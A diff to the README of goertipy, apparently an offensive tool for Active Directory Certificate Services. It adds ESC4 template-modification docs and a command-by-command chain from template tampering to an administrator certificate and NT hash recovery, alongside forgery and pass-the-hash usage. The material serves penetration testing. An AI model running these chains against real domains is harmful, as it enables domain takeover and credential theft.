@@ -8,11 +8,12 @@ An Active Directory Certificate Services (AD CS) enumeration and exploitation to
 
 ## Features
 
-- **AD CS Enumeration** — Discover CAs, certificate templates, and detect ESC1–ESC4, ESC6–ESC9, ESC13, ESC15
+- **AD CS Enumeration** — Discover CAs, templates, detect ESC1–ESC4, ESC6–ESC9, ESC13, ESC15 with exploitability scoring
 - **Certificate Enrollment** — Request certs via RPC (ICertPassage), HTTP/HTTPS (certsrv), or SMB named pipe
 - **PKINIT Authentication** — Authenticate with certificates, recover NT hashes (UnPAC-the-Hash)
 - **Certificate Inspection** — Inspect PFX/PEM certificates locally (subject, EKUs, SANs, key size)
 - **CA Backup** — Fetch CA public certificate from LDAP
+- **Template Modification** — ESC4 exploitation: modify template → ESC1, request cert, restore original
 - **Golden Certificate Forgery** — Forge certs as any user using a stolen CA private key
 - **Security Descriptor Parsing** — Full Windows ACL/ACE/SID parsing with permission analysis
 - **Pass-the-Hash** — NTLM hash authentication on all commands via `--hashes LM:NT`
@@ -39,6 +40,7 @@ go build -o goertipy ./cmd/goertipy
 | `find` | Enumerate CAs and templates, detect ESC vulnerabilities |
 | `req` | Request certificates (RPC / pipe / HTTP) |
 | `auth` | PKINIT authentication → TGT + NT hash |
+| `template` | Modify/restore certificate templates (ESC4 exploitation) |
 | `cert show` | Inspect PFX/PEM certificate details |
 | `ca backup` | Backup CA public certificate from LDAP |
 | `forge` | Golden certificate forgery |
@@ -57,6 +59,12 @@ goertipy find -u administrator -d corp.local --dc-ip 10.0.0.1 -H :aabbccdd112233
 # Only vulnerable templates
 goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
 
+# Enabled + vulnerable only
+goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
+
+# Filter by CA name
+goertipy find -u user@corp.local --dc-ip 10.0.0.1 --ca-name 'corp-CA'
+
 # JSON output
 goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
 ```
@@ -73,6 +81,7 @@ goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
 | `--no-color` | | Disable colored output |
 | `--vulnerable` | | Show only vulnerable templates |
 | `--enabled` | | Show only enabled templates |
+| `--ca-name` | | Filter templates by publishing CA name |
 | `--hide-admins` | | Hide default admin permissions |
 | `--verbose` | `-v` | Verbose output |
 | `--debug` | | Debug output |
@@ -234,6 +243,40 @@ goertipy forge --ca-pfx ca.pfx --upn admin@corp.local --validity 30 -o golden.pf
 
 ---
 
+### Template (ESC4 Exploitation)
+
+Modify a certificate template's attributes to make it ESC1-exploitable, then restore after use.
+
+```bash
+# Modify template (saves backup automatically)
+goertipy template modify -u user@corp.local --dc-ip 10.0.0.1 \
+  --template VulnTemplate
+
+# Restore original template from backup
+goertipy template restore -u user@corp.local --dc-ip 10.0.0.1 \
+  --backup VulnTemplate_backup.json
+```
+
+**Modify** changes these attributes:
+
+- `msPKI-Certificate-Name-Flag` → add `ENROLLEE_SUPPLIES_SUBJECT`
+- `msPKI-Enrollment-Flag` → clear `PEND_ALL_REQUESTS` (manager approval)
+- `msPKI-RA-Signature` → set to `0` (no authorized signatures)
+- `pKIExtendedKeyUsage` → set to Client Authentication
+
+| Flag | Description |
+|------|-------------|
+| `--template` | Template name to modify (required for `modify`) |
+| `--backup` | Backup file path (default: `{template}_backup.json`) |
+| `--username` / `-u` | Username |
+| `--password` / `-p` | Password (prompted if omitted) |
+| `--hashes` / `-H` | NTLM hash (LM:NT or :NT) |
+| `--domain` / `-d` | Target domain |
+| `--dc-ip` | Domain Controller IP |
+| `--scheme` | LDAP scheme (default: ldaps) |
+
+---
+
 ## Attack Chains
 
 ### ESC1 — Enrollee Supplies Subject
@@ -247,6 +290,29 @@ goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
 # 3. Authenticate and recover NT hash
+goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
+  --pfx corp-CA_VulnTemplate.pfx
+```
+
+### ESC4 — Template Modification
+
+```bash
+# 1. Find templates with dangerous ACLs
+goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable --enabled
+
+# 2. Modify template to be ESC1-exploitable (auto-saves backup)
+goertipy template modify -u user@corp.local --dc-ip 10.0.0.1 \
+  --template VulnTemplate
+
+# 3. Request cert with admin UPN (now ESC1)
+goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
+  --template VulnTemplate --upn administrator@corp.local
+
+# 4. Restore original template
+goertipy template restore -u user@corp.local --dc-ip 10.0.0.1 \
+  --backup VulnTemplate_backup.json
+
+# 5. Authenticate with forged cert
 goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
   --pfx corp-CA_VulnTemplate.pfx
 ```
@@ -303,7 +369,7 @@ secretsdump.py -hashes :NT_HASH corp.local/administrator@10.0.0.1
 goertipy/
 ├── cmd/goertipy/         # CLI entry point
 ├── docs/                 # Deep dive documentation with protocol diagrams
-├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge)
+├── internal/commands/    # Cobra command definitions (find, req, auth, cert, ca, forge, template)
 └── pkg/
     ├── adcs/             # AD CS enrollment (RPC, HTTP, pipe), enumeration, vuln detection
     │   └── flags/        # Certificate template and EKU constants
